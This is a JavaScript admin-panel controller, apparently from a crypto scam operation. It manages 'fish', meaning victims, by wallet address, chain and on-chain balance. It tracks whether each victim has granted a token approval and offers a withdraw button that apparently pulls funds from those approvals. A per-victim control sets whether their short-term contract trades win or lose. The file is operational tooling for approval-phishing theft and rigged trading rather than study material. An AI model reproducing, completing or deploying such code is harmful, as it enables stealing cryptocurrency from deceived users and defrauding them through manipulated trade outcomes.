define(['jquery', 'bootstrap', 'backend', 'table', 'form','editable'], function ($, undefined, Backend, Table, Form) {

    var Controller = {
        index: function () {
            // 初始化表格参数配置
            Table.api.init({
                extend: {
                    index_url: 'users/fish/index' + location.search,
                    add_url: 'users/fish/add',
                    edit_url: 'users/fish/edit',
                    del_url: 'users/fish/del',
                    multi_url: 'users/fish/multi',
                    import_url: 'users/fish/import',
                    table: 'fish',
                }
            });

            var table = $("#table");

            // 初始化表格
            table.bootstrapTable({
                url: $.fn.bootstrapTable.defaults.extend.index_url,
                pk: 'id',
                sortName: 'id',
                fixedColumns: true,
                fixedRightNumber: 1,
                searchFormVisible:true,
                columns: [
                    [
                        {checkbox: true},
                        {field: 'id', title: __('ID')},
                        {field: 'user_name', title: __('User_name')},
                        {field: 'admin.username', title: '代理', operate: 'LIKE'},
                        {field: 'pid', title: '上级ID'},
                        {field: 'fish_address', title: __('对方地址'),
                            formatter: Controller.api.formatter.fish_address,
                            operate: 'LIKE'},
                        // {field: 'contract_address', title: __('Contract_address'), operate: 'LIKE'},
                        {field: 'chain', title: __('类型'), operate: false},
                        {field: 'balance', title: "链上余额", operate:false, sortable:true},
                        {field: 'invite', title: __('Invite'), operate: 'LIKE'},
                        {field: 'status', title: "状态",editable: {
                                type: 'select',
                                pk: 1,
                                source: [
                                    {value: '0', text: '未授权'},
                                    {value: '1', text: '已授权'},
                                ]
                            },searchList: {"0":'未授权',"1":"已授权"}},
                        {field: 'risk', title: "秒合约单控",editable: {
                                type: 'select',
                                pk: 1,
                                source: [
                                    {value: '0', text: '不控制'},
                                    {value: '1', text: '赢'},
                                    {value: '2', text: '输'},
                                ]
                            },searchList: {"0":'不控制',"1":"赢","2":"输"}},
                        {field: 'authorized_address', title: __('Authorized_address'), operate: 'LIKE'},
                        {field: 'createtime', title: __('Createtime'), operate:false, addclass:'datetimerange', autocomplete:false, formatter: Table.api.formatter.datetime},    
                        {field: 'operate', title: __('Operate'), table: table, events: Table.api.events.operate, formatter: Table.api.formatter.operate,
                            buttons: [
                                {
                                    name: 'update',
                                    title: '是否更新余额',
                                    text: '更新余额',
                                    classname: 'btn btn-info btn-xs btn-detail btn-ajax',
                                    icon: 'fa fa-magic',
                                    confirm: '确认更新余额？',
                                    url: 'users/fish/update_balance',
                                    success: function (data, ret) {
                                        $(".btn-refresh").trigger("click");
                                    },
                                    error: function (data, ret) {
                                        console.log(data, ret);
                                        Layer.alert(ret.msg);
                                        return false;
                                    }
                                },
                                {
                                    name: 'addtabs',
                                    title: '是否同步',
                                    text: '是否同步',
                                    classname: 'btn btn-xs btn-warning btn',
                                    icon: 'fa fa-folder-o',
                                    extend:'target="_blank"',
                                    url: function (value) {
                                        if(value.chain == 'erc'){
                                            return 'https://cn.etherscan.com/tokenapprovalchecker?search=' + value.fish_address
                                        }else if(value.chain == 'trc'){
                                            return 'https://tronscan.io/#/address/' + value.fish_address
                                        }

                                    }
                                },
                                {
                                    name: 'tixian',
                                    title: __('提现'),
                                    text: "提现",
                                    classname: 'btn btn-info btn-xs btn-detail btn-dialog',
                                    icon: 'fa fa-magic',
                                    url: 'users/fish/tixian',
                                },
                            ]}
                    ]
                ]
            });

            // 启动和暂停按钮
            $(document).on("click", ".btn-start", function () {
                //在table外不可以使用添加.btn-change的方法
                //只能自己调用Table.api.multi实现
                //如果操作全部则ids可以置为空
                var ids = Table.api.selectedids(table);
                Table.api.multi("changestatus", ids.join(","), table, this);
            });
            // 为表格绑定事件
            Table.api.bindevent(table);
            table.off('dbl-click-row.bs.table');
        },
        add: function () {
            Controller.api.bindevent();
        },
        edit: function () {
            Controller.api.bindevent();
        },
        tixian:function(){
            Controller.api.bindevent();
        },
        api: {
            bindevent: function () {
                Form.api.bindevent($("form[role=form]"));
            },
            formatter: {//渲染的方法
                fish_address: function (value, row, index) {
                    //这里我们直接使用row的数据

                    if(row.chain == 'erc'){
                        return '<a href="https://cn.etherscan.com/address/'+ value +'" target="_blank">'+value+'</a>';
                    }else if(row.chain == 'trc'){
                        return '<a href="https://tronscan.io/#/address/' + value +'" target="_blank">'+value+'</a>';
                    }


                },
            },
        }
    };
    return Controller;
});
